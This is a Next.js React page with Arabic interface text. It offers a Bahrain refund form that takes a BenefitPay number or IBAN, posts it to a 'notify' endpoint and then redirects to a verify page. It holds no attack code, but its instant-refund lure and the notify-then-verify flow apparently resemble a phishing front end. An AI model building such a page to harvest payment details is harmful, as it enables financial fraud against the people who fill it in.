"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { CreditCard, Landmark, Loader2, ShieldCheck } from "lucide-react";

type Method = "benefit" | "iban";

export default function HomePage() {
  const router = useRouter();
  const [method, setMethod] = useState<Method>("benefit");
  const [benefit, setBenefit] = useState("");
  const [iban, setIban] = useState("");
  const [amount, setAmount] = useState("");
  const [showAmount, setShowAmount] = useState(false);
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    fetch("/api/public/flags")
      .then((r) => r.json())
      .then((d) => setShowAmount(Boolean(d?.showCustomerAmountInput)))
      .catch(() => setShowAmount(false));
  }, []);

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    const value = method === "benefit" ? benefit.trim() : iban.trim().toUpperCase();
    if (method === "benefit" && !/^\d{8}$/.test(value)) {
      setError("أدخل رقم بنفت باي مكوّناً من 8 أرقام.");
      return;
    }
    if (method === "iban" && !/^BH\d{2}[A-Z0-9]{14,26}$/.test(value)) {
      setError("أدخل رقم آيبان بحريني صحيح يبدأ بـ BH.");
      return;
    }
    const parsedAmount = showAmount && amount.trim() ? Number(amount) : undefined;
    if (parsedAmount !== undefined && (!Number.isFinite(parsedAmount) || parsedAmount <= 0)) {
      setError("أدخل مبلغ استرجاع صحيح.");
      return;
    }

    setSubmitting(true);
    try {
      sessionStorage.setItem("refund_request", JSON.stringify({ method, value, amount: parsedAmount }));
      await fetch("/api/notify/refund", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ method, value, amount: parsedAmount }),
      });
      router.push("/verify");
    } catch {
      setError("تعذّر إتمام الطلب. حاول مرة أخرى.");
      setSubmitting(false);
    }
  }

  return (
    <main className="mx-auto flex min-h-screen w-full max-w-2xl flex-col justify-center px-4 py-10">
      <div className="card-soft animate-fade-in p-6 sm:p-8">
        <div className="flex items-center gap-3">
          <span className="btn-brand flex h-12 w-12 items-center justify-center rounded-2xl">
            <ShieldCheck className="h-6 w-6" />
          </span>
          <div>
            <h1 className="text-xl font-extrabold sm:text-2xl">استرجاع الأموال</h1>
            <p className="mt-1 text-sm text-muted-foreground">
              اختر طريقة الاسترجاع المناسبة لك، وسنحوّل المبلغ إلى حسابك خلال ثوانٍ معدودة.
            </p>
          </div>
        </div>

        <form onSubmit={onSubmit} className="mt-7 space-y-5">
          {showAmount && (
            <div>
              <label htmlFor="amount" className="mb-2 block text-sm font-bold">
                مبلغ الاسترجاع
              </label>
              <div className="flex items-stretch gap-2" dir="ltr">
                <input
                  id="amount"
                  type="number"
                  min={0}
                  step="0.001"
                  inputMode="decimal"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.000"
                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
                />
                <span className="flex items-center rounded-xl bg-secondary px-4 text-sm font-bold text-secondary-foreground">
                  BHD
                </span>
              </div>
              <p className="mt-2 text-xs text-muted-foreground">المبلغ بالدينار البحريني (اختياري).</p>
            </div>
          )}

          <div className="grid gap-3 sm:grid-cols-2">
            <MethodCard
              active={method === "benefit"}
              icon={<CreditCard className="h-5 w-5" />}
              title="BenefitPay"
              hint="تحويل فوري على رقم بنفت باي"
              onClick={() => setMethod("benefit")}
            />
            <MethodCard
              active={method === "iban"}
              icon={<Landmark className="h-5 w-5" />}
              title="IBAN"
              hint="تحويل بنكي على رقم الآيبان"
              onClick={() => setMethod("iban")}
            />
          </div>

          {method === "benefit" ? (
            <div>
              <label htmlFor="benefit" className="mb-2 block text-sm font-bold">
                رقم بنفت باي
              </label>
              <div className="flex items-stretch gap-2" dir="ltr">
                <span className="flex items-center rounded-xl bg-secondary px-4 text-sm font-bold text-secondary-foreground">
                  +973
                </span>
                <input
                  id="benefit"
                  inputMode="numeric"
                  maxLength={8}
                  value={benefit}
                  onChange={(e) => setBenefit(e.target.value.replace(/\D/g, "").slice(0, 8))}
                  placeholder="33XXXXXX"
                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
                />
              </div>
            </div>
          ) : (
            <div>
              <label htmlFor="iban" className="mb-2 block text-sm font-bold">
                رقم الآيبان
              </label>
              <input
                id="iban"
                dir="ltr"
                value={iban}
                onChange={(e) => setIban(e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, ""))}
                placeholder="BH00XXXX00000000000000"
                className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
              />
            </div>
          )}

          {error && <p className="text-sm font-semibold text-destructive">{error}</p>}

          <button
            type="submit"
            disabled={submitting}
            className="btn-brand inline-flex w-full items-center justify-center gap-2 rounded-2xl px-6 py-4 text-base font-extrabold"
          >
            {submitting && <Loader2 className="h-5 w-5 animate-spin" />}
            أكمل الاسترجاع
          </button>
          <p className="text-center text-xs text-muted-foreground">
            جميع البيانات محمية ومشفّرة أثناء النقل.
          </p>
        </form>
      </div>
    </main>
  );
}

function MethodCard({
  active,
  icon,
  title,
  hint,
  onClick,
}: {
  active: boolean;
  icon: React.ReactNode;
  title: string;
  hint: string;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      aria-pressed={active}
      className={`rounded-2xl border p-4 text-right transition ${
        active
          ? "border-primary bg-accent shadow-[0_14px_35px_-24px_oklch(0.53_0.22_26/0.7)]"
          : "border-border bg-background hover:border-primary/50"
      }`}
    >
      <span
        className={`flex h-10 w-10 items-center justify-center rounded-xl ${
          active ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground"
        }`}
      >
        {icon}
      </span>
      <p className="mt-3 text-sm font-extrabold">{title}</p>
      <p className="mt-1 text-xs text-muted-foreground">{hint}</p>
    </button>
  );
}
